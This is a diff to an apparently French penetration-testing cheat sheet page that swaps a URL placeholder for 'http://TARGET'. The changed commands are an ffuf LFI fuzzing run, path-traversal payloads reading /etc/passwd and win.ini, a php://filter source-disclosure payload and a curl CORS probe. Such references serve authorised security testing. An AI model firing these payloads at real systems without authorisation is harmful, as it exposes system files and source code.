@@ -167,7 +167,7 @@
         
         <div class="cmd-item">
             <div class="code-block">
-                <code>ffuf -u "<span class="variable" data-var="url">URL</span>?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:x:"</code>
+                <code>ffuf -u "http://<span class="variable" data-var="target">TARGET</span>?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:x:"</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -180,7 +180,7 @@
 
         <div class="cmd-item">
             <div class="code-block">
-                <code><span class="variable" data-var="url">URL</span>?file=../../../../etc/passwd</code>
+                <code>http://<span class="variable" data-var="target">TARGET</span>?file=../../../../etc/passwd</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -193,7 +193,7 @@
 
         <div class="cmd-item">
             <div class="code-block">
-                <code><span class="variable" data-var="url">URL</span>?file=../../../../windows/win.ini</code>
+                <code>http://<span class="variable" data-var="target">TARGET</span>?file=../../../../windows/win.ini</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -206,7 +206,7 @@
 
         <div class="cmd-item">
             <div class="code-block">
-                <code><span class="variable" data-var="url">URL</span>?file=php://filter/convert.base64-encode/resource=index.php</code>
+                <code>http://<span class="variable" data-var="target">TARGET</span>?file=php://filter/convert.base64-encode/resource=index.php</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -436,7 +436,7 @@
         <p class="cmd-description">Action : Vérifier si l'API accepte des origines arbitraires</p>
         <div class="cmd-item">
             <div class="code-block">
-                <code>curl -H "Origin: http://corsfind.com" -I <span class="variable" data-var="url">URL</span></code>
+                <code>curl -H "Origin: http://corsfind.com" -I http://<span class="variable" data-var="target">TARGET</span></code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
